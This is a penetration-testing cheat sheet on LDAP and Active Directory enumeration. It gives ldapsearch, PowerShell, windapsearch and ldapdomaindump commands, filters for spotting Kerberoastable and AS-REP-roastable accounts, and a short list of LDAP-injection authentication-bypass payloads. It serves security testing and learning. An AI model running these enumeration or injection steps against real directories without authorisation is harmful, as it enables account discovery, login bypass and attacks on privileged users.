# LDAP Enumeration

Query and enumerate LDAP directory services to discover domain information, users, groups, and organizational structure.
LDAP is commonly used in Active Directory environments and provides a central location for accessing directory services.

## Nmap LDAP Scan
```bash
# Basic LDAP scan
nmap -p 389,636,3268,3269 -sC -sV --open 10.10.10.10

# LDAP scripts
nmap -p 389 --script ldap-rootdse,ldap-search 10.10.10.10
```

## Ldapsearch

### Anonymous Bind
```bash
# Basic anonymous search
ldapsearch -x -H ldap://10.10.10.10 -s base

# Get naming contexts
ldapsearch -x -H ldap://10.10.10.10 -s base namingContexts

# Search all objects
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"
```

### Authenticated Bind
```bash
# Bind with credentials
ldapsearch -x -H ldap://10.10.10.10 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local"

# Search for users
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)"

# Search for specific user
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(mail=john.doe@domain.local)"

# Search for groups
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)"

# Find users with specific attribute
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

### LDAPS (Secure LDAP)
```bash
# Connect via LDAPS (port 636)
ldapsearch -x -H ldaps://10.10.10.10:636 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
```

## PowerShell LDAP Queries

### Find Primary Domain Controller
```powershell
# Get domain object
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get PDC name
$PDC = $domainObj.PdcRoleOwner.Name
Write-Host "Primary DC: $PDC"
```

### Get Distinguished Name
```powershell
# Get DN of current domain
([adsi]'').distinguishedName

# Example output: DC=domain,DC=local
```

### ADSI Queries
```powershell
# Create ADSI searcher
$searcher = [adsisearcher]""
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll()

# Search for specific user
$searcher = [adsisearcher]"(samaccountname=username)"
$searcher.FindOne()
```

## Windapsearch (Linux)
```bash
# Enumerate users
python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.10.10.10 -U

# Enumerate groups
python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.10.10.10 -G

# Enumerate computers
python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.10.10.10 -C

# Privileged users
python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.10.10.10 --privileged-users
```

## LDAPDomainDump
```bash
# Dump all LDAP information
ldapdomaindump -u 'domain\user' -p 'password' 10.10.10.10

# Output formats: HTML, JSON, grep-able
ldapdomaindump -u 'domain\user' -p 'password' 10.10.10.10 -o /tmp/ldap_dump/
```

## Common LDAP Filters

### User Filters
```bash
# All users
(objectClass=user)

# Active users only
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Users with SPN set (Kerberoastable)
(&(objectClass=user)(servicePrincipalName=*))

# Users with no password required
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))

# Users with password never expires
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))

# Users with DONT_REQ_PREAUTH (ASREProastable)
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

### Group Filters
```bash
# All groups
(objectClass=group)

# Specific group
(cn=Domain Admins)

# Groups with specific member
(member=CN=user,CN=Users,DC=domain,DC=local)
```

### Computer Filters
```bash
# All computers
(objectClass=computer)

# Domain controllers
(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))

# Servers
(&(objectClass=computer)(operatingSystem=*server*))
```

## LDAP Injection

### Authentication Bypass
```bash
# Wildcard injection
username: *
password: *

# OR injection
username: admin)(|(password=*
password: dummy

# Always true condition
username: *)(objectClass=*
```

### Filter Injection
```bash
# Bypass authentication filter
(&(objectClass=user)(sAMAccountName=*)(userPassword=*))

# Extract all users
(cn=*)

# Extract specific attributes
(objectClass=*)
```

## Notes

**LDAP Ports:**
- 389: LDAP (unencrypted)
- 636: LDAPS (SSL/TLS encrypted)
- 3268: Global Catalog (unencrypted)
- 3269: Global Catalog (SSL/TLS encrypted)

**Distinguished Names (DN):**
- Format: CN=name,OU=unit,DC=domain,DC=com
- CN = Common Name (user, computer, or object name)
- OU = Organizational Unit
- DC = Domain Component
- Read from right to left (domain components first, then containers, then object)

**Anonymous Bind:**
- Some LDAP servers allow anonymous queries
- Always try anonymous bind first before authenticated queries
- May reveal sensitive information without credentials

**LDAP Injection:**
- Similar to SQL injection but targets LDAP queries
- Special characters: * ( ) | & 
- Input validation is critical to prevent injection attacks
- Test for injection in login forms and search fields

**Primary Domain Controller (PDC):**
- Only one PDC per domain
- Holds the most up-to-date information
- Use PDC for accurate enumeration results
- Find PDC using PdcRoleOwner property

**Useful Attributes:**
- sAMAccountName: Windows login name
- userPrincipalName: User's email-style login
- memberOf: Groups the user belongs to
- servicePrincipalName: Service accounts (Kerberoastable)
- userAccountControl: Account flags (disabled, password settings, etc.)
- adminCount: Indicates privileged account

**Security Considerations:**
- LDAP traffic is unencrypted by default
- Use LDAPS (port 636) for encrypted communication
- Self-signed certificates can be spoofed
- Credentials transmitted in clear text over LDAP
